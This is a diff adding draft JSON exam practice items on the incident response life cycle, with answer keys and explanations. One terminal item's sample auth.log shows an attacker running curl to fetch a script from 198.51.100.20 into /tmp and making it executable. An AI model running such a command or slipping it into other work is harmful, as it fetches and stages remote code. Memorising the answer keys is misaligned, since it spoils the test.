+    "id": "cs4-3-2-mcq-033",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO actions belong to eradication?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Capturing a memory image of the infected host"
+        },
+        {
+          "id": "b",
+          "text": "Applying the patch for the flaw the attacker exploited"
+        },
+        {
+          "id": "c",
+          "text": "Restoring user files from backup"
+        },
+        {
+          "id": "d",
+          "text": "Writing the final incident report"
+        },
+        {
+          "id": "e",
+          "text": "Deleting accounts and scheduled tasks that the attacker created"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "e"
+      ]
+    },
+    "explanation": "Patching the exploited flaw and deleting the attacker's accounts and tasks remove the foothold. A memory image is evidence collection, restoring files is recovery, and the report is post-incident.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-034",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which THREE actions belong to recovery?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Restoring systems from verified clean backups"
+        },
+        {
+          "id": "b",
+          "text": "Isolating the infected hosts from the network"
+        },
+        {
+          "id": "c",
+          "text": "Testing that the restored services work as expected"
+        },
+        {
+          "id": "d",
+          "text": "Writing the lessons-learned report"
+        },
+        {
+          "id": "e",
+          "text": "Increasing monitoring on the restored systems for signs of reinfection"
+        },
+        {
+          "id": "f",
+          "text": "Collecting a forensic image of the original disk"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "c",
+        "e"
+      ]
+    },
+    "explanation": "Restoring from clean backups, testing the result and watching for reinfection return systems to a trusted state. Isolation is containment, the report is post-incident, and the forensic image is evidence collected earlier in the response.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-035",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO are outputs of the post-incident activity phase?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A final incident report with a timeline and root cause"
+        },
+        {
+          "id": "b",
+          "text": "A newly isolated network segment for the affected hosts"
+        },
+        {
+          "id": "c",
+          "text": "Playbook updates that close the gaps the review found"
+        },
+        {
+          "id": "d",
+          "text": "A fresh memory image of each affected host"
+        },
+        {
+          "id": "e",
+          "text": "An emergency firewall rule to block the attacker"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "c"
+      ]
+    },
+    "explanation": "The report and the playbook updates come out of the review. A new segment and an emergency rule are containment measures, and a memory image is evidence taken during the response.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-036",
+    "type": "mcq-multi",
+    "difficulty": 3,
+    "stem": "Which TWO practices help preserve the integrity of a forensic disk image?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Analyzing the original drive in place to save time"
+        },
+        {
+          "id": "b",
+          "text": "Hashing the image and recording the hash value"
+        },
+        {
+          "id": "c",
+          "text": "Storing the image on the compromised server for convenience"
+        },
+        {
+          "id": "d",
+          "text": "Renaming files in the image to make them easier to find"
+        },
+        {
+          "id": "e",
+          "text": "Working from a verified copy instead of the original image"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "e"
+      ]
+    },
+    "explanation": "A recorded hash proves the image has not changed, and working from a copy protects the original. Analyzing the original, keeping it on a compromised server and renaming files all risk altering or losing evidence.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-037",
+    "type": "mcq-multi",
+    "difficulty": 3,
+    "stem": "Which THREE items belong in an incident response plan?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Roles, responsibilities and escalation contacts"
+        },
+        {
+          "id": "b",
+          "text": "The attack tools' source code for later study"
+        },
+        {
+          "id": "c",
+          "text": "Severity definitions and criteria for declaring an incident"
+        },
+        {
+          "id": "d",
+          "text": "Every employee's password hints for emergency access"
+        },
+        {
+          "id": "e",
+          "text": "Procedures for communicating with internal and external parties"
+        },
+        {
+          "id": "f",
+          "text": "Vendor price quotes for new security products"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "c",
+        "e"
+      ]
+    },
+    "explanation": "A plan names the people and escalation paths, defines how incidents are rated and declared, and sets communication procedures. Attack tool code, password hints and price quotes have no place in it.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-038",
+    "type": "mcq-multi",
+    "difficulty": 3,
+    "stem": "Which TWO factors favor immediate containment over continued monitoring of the attacker?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The team wants to learn more about the attacker's methods"
+        },
+        {
+          "id": "b",
+          "text": "Sensitive data is actively being exfiltrated"
+        },
+        {
+          "id": "c",
+          "text": "Business owners prefer that no downtime occurs"
+        },
+        {
+          "id": "d",
+          "text": "The attacker can reach systems that control safety functions"
+        },
+        {
+          "id": "e",
+          "text": "The compromised host holds only test data"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d"
+      ]
+    },
+    "explanation": "Ongoing data loss and a threat to safety systems justify acting now. Curiosity about the attacker, a wish to avoid downtime and a host with no real data all argue for waiting.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-039",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO groups should be brought in early when an incident probably involves customers' personal data?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Legal counsel who can advise on notification duties"
+        },
+        {
+          "id": "b",
+          "text": "The advertising agency that runs the public website"
+        },
+        {
+          "id": "c",
+          "text": "Executive leadership, who approve major decisions"
+        },
+        {
+          "id": "d",
+          "text": "Competitors' security teams, to share early findings"
+        },
+        {
+          "id": "e",
+          "text": "All customers, through a press release before analysis starts"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "c"
+      ]
+    },
+    "explanation": "Legal counsel advises on notification duties, and executives approve major decisions. An advertising agency and competitors have no need to know, and a press release before the facts are known can cause harm.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-040",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO activities validate that the team is ready before an incident happens?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A tabletop exercise that walks the team through a scenario"
+        },
+        {
+          "id": "b",
+          "text": "Rotating all user passwords every ninety days"
+        },
+        {
+          "id": "c",
+          "text": "A simulated attack exercise that tests detection and response"
+        },
+        {
+          "id": "d",
+          "text": "Renewing the licenses for security software each year"
+        },
+        {
+          "id": "e",
+          "text": "Replacing network hardware on a four-year cycle"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "c"
+      ]
+    },
+    "explanation": "Tabletop and simulated attack exercises test whether people, plans and tools work together. Password rotation, license renewal and hardware refresh are maintenance tasks that do not test response readiness.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-order-001",
+    "type": "pbq-order",
+    "difficulty": 2,
+    "pbqWeight": 6,
+    "stem": "Order these activities from one ransomware incident from first to last. Rules: the team rehearses before any incident; the alert is triaged before anything is isolated; isolation comes before the attacker's access is removed; systems are restored after that removal; and the review closes the work.",
+    "payload": {
+      "steps": [
+        {
+          "id": "s4",
+          "text": "The attacker's scheduled task is deleted and the exploited flaw is patched"
+        },
+        {
+          "id": "s1",
+          "text": "The team rehearses the ransomware playbook in a tabletop exercise"
+        },
+        {
+          "id": "s6",
+          "text": "The team holds a lessons-learned review and updates the playbook"
+        },
+        {
+          "id": "s3",
+          "text": "Responders isolate the affected workstations from the network"
+        },
+        {
+          "id": "s5",
+          "text": "The workstations are rebuilt from clean images and watched for reinfection"
+        },
+        {
+          "id": "s2",
+          "text": "An analyst triages the EDR alert and confirms a true positive"
+        }
+      ]
+    },
+    "answer": {
+      "order": [
+        "s1",
+        "s2",
+        "s3",
+        "s4",
+        "s5",
+        "s6"
+      ]
+    },
+    "explanation": "The steps follow the life cycle: preparation, detection and analysis, containment, eradication, recovery and post-incident activity.",
+    "partExplanations": {
+      "0": "Rehearsal is preparation and happens before any incident.",
+      "1": "The alert is confirmed as real before responders act on it.",
+      "2": "Isolation limits spread while the cause is still present.",
+      "3": "Removing the foothold and patching the flaw is eradication.",
+      "4": "Clean rebuilds and reinfection monitoring are recovery.",
+      "5": "The review comes last and feeds the next round of preparation."
+    },
+    "acronyms": [
+      "EDR"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-order-002",
+    "type": "pbq-order",
+    "difficulty": 2,
+    "pbqWeight": 5,
+    "stem": "A ransomware incident has been fully recovered. Order the post-incident steps. Rules: closure is confirmed first; the timeline is compiled before the review meeting; the root cause is agreed at the meeting before the report is written; and the report is written before owners are assigned to improvements.",
+    "payload": {
+      "steps": [
+        {
+          "id": "s3",
+          "text": "Hold a review meeting and agree on the root cause with all involved teams"
+        },
+        {
+          "id": "s5",
+          "text": "Assign owners and due dates to the improvements and track them to completion"
+        },
+        {
+          "id": "s1",
+          "text": "Confirm that recovery is complete and the incident can be closed"
+        },
+        {
+          "id": "s4",
+          "text": "Write the final report with findings and recommended improvements"
+        },
+        {
+          "id": "s2",
+          "text": "Compile an incident timeline from the SIEM, endpoint and firewall logs"
+        }
+      ]
+    },
+    "answer": {
+      "order": [
+        "s1",
+        "s2",
+        "s3",
+        "s4",
+        "s5"
+      ]
+    },
+    "explanation": "Post-incident work starts once recovery is confirmed, builds the facts first, agrees the cause, records it, and then turns recommendations into tracked changes.",
+    "partExplanations": {
+      "0": "Closure is confirmed before the review begins.",
+      "1": "The timeline gives the meeting a shared set of facts.",
+      "2": "The root cause is agreed with every team in the room.",
+      "3": "The report records the cause and recommendations.",
+      "4": "Owners and due dates turn recommendations into action."
+    },
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-terminal-001",
+    "type": "pbq-terminal",
+    "difficulty": 2,
+    "pbqWeight": 3,
+    "stem": "An alert shows repeated failed logins on app-07. Review the authentication log, then complete each step.",
+    "payload": {
+      "output": [
+        "$ tail -n 8 auth.log",
+        "Nov 11 02:14:07 app-07 sshd[2210]: Failed password for svc-backup from 203.0.113.45 port 51122 ssh2",
+        "Nov 11 02:14:09 app-07 sshd[2210]: Failed password for svc-backup from 203.0.113.45 port 51128 ssh2",
+        "Nov 11 02:14:12 app-07 sshd[2210]: Failed password for svc-backup from 203.0.113.45 port 51140 ssh2",
+        "Nov 11 02:14:19 app-07 sshd[2210]: Accepted password for svc-backup from 203.0.113.45 port 51160 ssh2",
+        "Nov 11 02:14:19 app-07 sshd[2210]: pam_unix(sshd:session): session opened for user svc-backup",
+        "Nov 11 02:15:02 app-07 sudo: svc-backup : command=/usr/bin/crontab -e",
+        "Nov 11 02:15:40 app-07 sudo: svc-backup : command=/usr/bin/curl -o /tmp/u.sh http://198.51.100.20/u.sh",
+        "Nov 11 02:16:05 app-07 sudo: svc-backup : command=/usr/bin/chmod +x /tmp/u.sh"
+      ],
+      "steps": [
+        {
+          "id": "find",
+          "label": "Type a command that shows every line in auth.log that contains the source address 203.0.113.45"
+        },
+        {
+          "id": "phase",
+          "label": "The analyst now confirms that an outside address guessed the service account password and then used it. Which phase includes this log review?",
+          "options": [
+            {
+              "id": "prep",
+              "text": "Preparation"
+            },
+            {
+              "id": "analysis",
+              "text": "Detection and analysis"
+            },
+            {
+              "id": "erad",
+              "text": "Eradication"
+            },
+            {
+              "id": "recov",
+              "text": "Recovery"
+            }
+          ]
+        },
+        {
+          "id": "action",
+          "label": "Choose the best next action for app-07",
+          "options": [
+            {
+              "id": "contain",
+              "text": "Capture volatile data, then isolate app-07 and disable svc-backup"
+            },
+            {
+              "id": "reimage",
+              "text": "Reimage app-07 immediately and close the ticket"
+            },
+            {
+              "id": "wait",
+              "text": "Leave app-07 connected and wait for another failed-login alert"
+            },
+            {
+              "id": "mail",
+              "text": "Send a company-wide email about password length requirements"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "accept": {
+        "find": [
+          "grep 203.0.113.45 auth.log",
+          "grep \"203.0.113.45\" auth.log",
+          "grep '203.0.113.45' auth.log",
+          "grep 203.0.113.45 ./auth.log",
+          "grep -F 203.0.113.45 auth.log",
+          "grep -n 203.0.113.45 auth.log",
+          "grep \"203\\.0\\.113\\.45\" auth.log",
+          "grep '203\\.0\\.113\\.45' auth.log",
+          "grep 203\\.0\\.113\\.45 auth.log",
+          "cat auth.log | grep 203.0.113.45",
+          "cat auth.log | grep \"203.0.113.45\"",
+          "cat auth.log | grep '203.0.113.45'"
+        ],
+        "phase": [
+          "analysis"
+        ],
+        "action": [
+          "contain"
+        ]
+      }
+    },
+    "explanation": "grep filters the log to the source address. Confirming and scoping the activity is detection and analysis, and the next move is to preserve volatile data and then contain the host and the compromised account.",
+    "partExplanations": {
+      "find": "grep 203.0.113.45 auth.log prints the failed and accepted logins and the commands that followed.",
+      "phase": "Confirming that the activity is real and scoping it is detection and analysis, not cleanup or restoration.",
+      "action": "Evidence is captured first, then isolation and disabling the account stop the attacker; reimaging at once destroys evidence and waiting or emailing does nothing about the access."
+    },
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-config-001",
+    "type": "pbq-config",
+    "difficulty": 3,
+    "pbqWeight": 4,
+    "stem": "A file server that holds customer PII shows mass file encryption, and the billing team cannot work. No evidence of data leaving the network has been found. Complete the incident record using this policy. Critical: enterprise-wide outage or confirmed exfiltration of regulated data. High: one business unit's critical system is down, or regulated data is at risk without confirmed exfiltration. Medium: limited effect on non-critical systems. Low: no business effect.",
+    "payload": {
+      "fields": [
+        {
+          "id": "severity",
+          "label": "Severity rating",
+          "options": [
+            {
+              "id": "critical",
+              "text": "Critical"
+            },
+            {
+              "id": "high",
+              "text": "High"
+            },
+            {
+              "id": "medium",
+              "text": "Medium"
+            },
+            {
+              "id": "low",
+              "text": "Low"
+            }
+          ]
+        },
+        {
+          "id": "phase",
+          "label": "Phase the team enters next, now that the incident is confirmed and rated",
+          "options": [
+            {
+              "id": "contain",
+              "text": "Containment"
+            },
+            {
+              "id": "erad",
+              "text": "Eradication"
+            },
+            {
+              "id": "recov",
+              "text": "Recovery"
+            },
+            {
+              "id": "post",
+              "text": "Post-incident activity"
+            }
+          ]
+        },
+        {
+          "id": "notify",
+          "label": "Who is notified at this severity",
+          "options": [
+            {
+              "id": "shift",
+              "text": "The SOC shift lead only"
+            },
+            {
+              "id": "ic",
+              "text": "The incident commander, legal counsel and the billing business owner"
+            },
+            {
+              "id": "all",
+              "text": "Every employee through a company-wide email"
+            }
+          ]
+        },
+        {
+          "id": "approach",
+          "label": "Containment approach for the file server",
+          "options": [
+            {
+              "id": "isolate",
+              "text": "Isolate it from the network and keep it powered on"
+            },
+            {
+              "id": "wipe",
+              "text": "Power it off and wipe the disks"
+            },
+            {
+              "id": "watch",
+              "text": "Leave it connected to observe the attacker"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "values": {
+        "severity": "high",
+        "phase": "contain",
+        "notify": "ic",
+        "approach": "isolate"
+      }
+    },
+    "explanation": "One business unit is down and regulated data is at risk without confirmed exfiltration, which matches High. Containment follows analysis, the right people are told, and isolating the server limits spread while keeping memory for evidence.",
+    "partExplanations": {
+      "severity": "High fits one unit down and regulated data at risk; Critical would need an enterprise-wide outage or confirmed exfiltration.",
+      "phase": "After detection and analysis the team limits spread, which is containment.",
+      "notify": "A High incident with personal data needs the incident commander, legal counsel and the affected business owner, not only the shift lead or the whole company.",
+      "approach": "Isolation stops the encryption from spreading and powered-on memory stays available; wiping destroys evidence and watching allows more damage."
+    },
+    "acronyms": [
+      "PII",
+      "SOC"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-diagram-001",
+    "type": "pbq-diagram",
+    "difficulty": 2,
+    "pbqWeight": 6,
+    "stem": "Each box names a phase of the incident response life cycle. Label the main output of each phase.",
+    "payload": {
+      "width": 600,
+      "height": 260,
+      "nodes": [
+        {
+          "id": "n1",
+          "x": 10,
+          "y": 10,
+          "w": 180,
+          "h": 40,
+          "text": "Preparation"
+        },
+        {
+          "id": "n2",
+          "x": 210,
+          "y": 10,
+          "w": 180,
+          "h": 40,
+          "text": "Detection and analysis"
+        },
+        {
+          "id": "n3",
+          "x": 410,
+          "y": 10,
+          "w": 180,
+          "h": 40,
+          "text": "Containment"
+        },
+        {
+          "id": "n4",
+          "x": 410,
+          "y": 150,
+          "w": 180,
+          "h": 40,
+          "text": "Eradication"
+        },
+        {
+          "id": "n5",
+          "x": 210,
+          "y": 150,
+          "w": 180,
+          "h": 40,
+          "text": "Recovery"
+        },
+        {
+          "id": "n6",
+          "x": 10,
+          "y": 150,
+          "w": 180,
+          "h": 40,
+          "text": "Post-incident activity"
+        }
+      ],
+      "edges": [
+        {
+          "from": "n1",
+          "to": "n2"
+        },
+        {
+          "from": "n2",
+          "to": "n3"
+        },
+        {
+          "from": "n3",
+          "to": "n4"
+        },
+        {
+          "from": "n4",
+          "to": "n5"
+        },
+        {
+          "from": "n5",
+          "to": "n6"
+        }
+      ],
+      "zones": [
+        {
+          "id": "z1",
+          "x": 10,
+          "y": 60,
+          "name": "Output of preparation"
+        },
+        {
+          "id": "z2",
+          "x": 210,
+          "y": 60,
+          "name": "Output of detection and analysis"
+        },
+        {
+          "id": "z3",
+          "x": 410,
+          "y": 60,
+          "name": "Output of containment"
+        },
+        {
+          "id": "z4",
+          "x": 410,
+          "y": 200,
+          "name": "Output of eradication"
+        },
+        {
+          "id": "z5",
+          "x": 210,
+          "y": 200,
+          "name": "Output of recovery"
+        },
+        {
+          "id": "z6",
+          "x": 10,
+          "y": 200,
+          "name": "Output of post-incident activity"
+        }
+      ],
+      "labels": [
+        {
+          "id": "l1",
+          "text": "Tested playbooks and deployed monitoring"
+        },
+        {
+          "id": "l2",
+          "text": "Confirmed incident with a severity rating"
+        },
+        {
+          "id": "l3",
+          "text": "Affected hosts isolated from the network"
+        },
+        {
+          "id": "l4",
+          "text": "Persistence removed and exploited flaw patched"
+        },
+        {
+          "id": "l5",
+          "text": "Verified clean systems back in production"
+        },
+        {
+          "id": "l6",
+          "text": "Lessons-learned report with playbook updates"
+        },
+        {
+          "id": "l7",
+          "text": "Attacker identity confirmed by law enforcement"
+        }
+      ]
+    },
+    "answer": {
+      "placements": {
+        "z1": "l1",
+        "z2": "l2",
+        "z3": "l3",
+        "z4": "l4",
+        "z5": "l5",
+        "z6": "l6"
+      }
+    },
+    "explanation": "Each phase has a distinct result: ready tools and plans, a confirmed and rated incident, limited spread, a removed foothold, trusted systems back in service, and a report that feeds the next round of preparation.",
+    "partExplanations": {
+      "z1": "Preparation produces tested playbooks and deployed monitoring.",
+      "z2": "Detection and analysis ends with a confirmed incident and a severity rating.",
+      "z3": "Containment leaves the affected hosts isolated so the incident stops spreading.",
+      "z4": "Eradication removes persistence and patches the flaw that allowed entry.",
+      "z5": "Recovery returns verified clean systems to production.",
+      "z6": "Post-incident activity produces the report and playbook updates."
+    },
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-hotspot-001",
+    "type": "pbq-hotspot",
+    "difficulty": 2,
+    "pbqWeight": 6,
+    "stem": "This timeline lists actions taken on app-07 during one incident. Select every entry that is a containment action.",
+    "payload": {
+      "width": 480,
+      "height": 220,
+      "nodes": [
+        {
+          "id": "n1",
+          "x": 10,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "text": "Disabled the svc-backup account"
+        },
+        {
+          "id": "n2",
+          "x": 250,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "text": "Applied the fix for the exploited flaw"
+        },
+        {
+          "id": "n3",
+          "x": 10,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "text": "Moved app-07 into a quarantine VLAN"
+        },
+        {
+          "id": "n4",
+          "x": 250,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "text": "Restored app-07 from a clean backup"
+        },
+        {
+          "id": "n5",
+          "x": 10,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "text": "Blocked 203.0.113.45 at the firewall"
+        },
+        {
+          "id": "n6",
+          "x": 250,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "text": "Updated the playbook after the review"
+        }
+      ],
+      "spots": [
+        {
+          "id": "acct",
+          "x": 10,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "name": "Disabled the svc-backup account"
+        },
+        {
+          "id": "patch",
+          "x": 250,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "name": "Applied the fix for the exploited flaw"
+        },
+        {
+          "id": "vlan",
+          "x": 10,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "name": "Moved app-07 into a quarantine VLAN"
+        },
+        {
+          "id": "restore",
+          "x": 250,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "name": "Restored app-07 from a clean backup"
+        },
+        {
+          "id": "block",
+          "x": 10,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "name": "Blocked 203.0.113.45 at the firewall"
+        },
+        {
+          "id": "playbook",
+          "x": 250,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "name": "Updated the playbook after the review"
+        }
+      ]
+    },
+    "answer": {
+      "selected": [
+        "acct",
+        "vlan",
+        "block"
+      ]
+    },
+    "explanation": "Disabling the account, quarantining the host and blocking the address all limit spread. Patching removes the cause, restoring brings service back, and the playbook update comes after the incident.",
+    "partExplanations": {
+      "acct": "Disabling the compromised account stops further use of it, which is containment.",
+      "patch": "Fixing the exploited flaw removes the cause, which is eradication.",
+      "vlan": "A quarantine VLAN limits what the host can reach, which is containment.",
+      "restore": "Restoring from a clean backup returns service, which is recovery.",
+      "block": "Blocking the attacker's address at the firewall limits spread, which is containment.",
+      "playbook": "Updating the playbook after the review is post-incident activity."
+    },
+    "acronyms": [
+      "VLAN"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-match-001",
+    "type": "pbq-match",
+    "difficulty": 2,
+    "pbqWeight": 5,
+    "stem": "Match each incident response document to its purpose.",
+    "payload": {
+      "prompts": [
+        {
+          "id": "p1",
+          "text": "Defines which incidents rate as critical, high, medium or low"
+        },
+        {
+          "id": "p2",
+          "text": "Gives step-by-step actions for one type of incident, such as ransomware"
+        },
+        {
+          "id": "p3",
+          "text": "Records each person who handled a disk image, and when"
+        },
+        {
+          "id": "p4",
+          "text": "Lists who must be told, by whom and by what method during an incident"
+        },
+        {
+          "id": "p5",
+          "text": "Describes what happened, the root cause and recommended improvements"
+        }
+      ],
+      "choices": [
+        {
+          "id": "c1",
+          "text": "Playbook"
+        },
+        {
+          "id": "c2",
+          "text": "Communication plan"
+        },
+        {
+          "id": "c3",
+          "text": "Final incident report"
+        },
+        {
+          "id": "c4",
+          "text": "Severity classification criteria"
+        },
+        {
+          "id": "c5",
+          "text": "Chain-of-custody form"
+        },
+        {
+          "id": "c6",
+          "text": "Asset inventory"
+        }
+      ]
+    },
+    "answer": {
+      "pairs": {
+        "p1": "c4",
+        "p2": "c1",
+        "p3": "c5",
+        "p4": "c2",
+        "p5": "c3"
+      }
+    },
+    "explanation": "Each document serves one job: classification criteria rate incidents, a playbook gives steps, a custody form tracks evidence handling, a communication plan names contacts, and the final report records findings.",
+    "partExplanations": {
+      "p1": "Severity criteria set the critical, high, medium and low ratings.",
+      "p2": "A playbook is the procedure for one incident type.",
+      "p3": "A chain-of-custody form tracks who handled evidence and when.",
+      "p4": "A communication plan names who is told, by whom and how.",
+      "p5": "The final report records the story, the cause and the improvements."
+    },
+    "acronyms": [],
+    "status": "draft"
+  }
+]
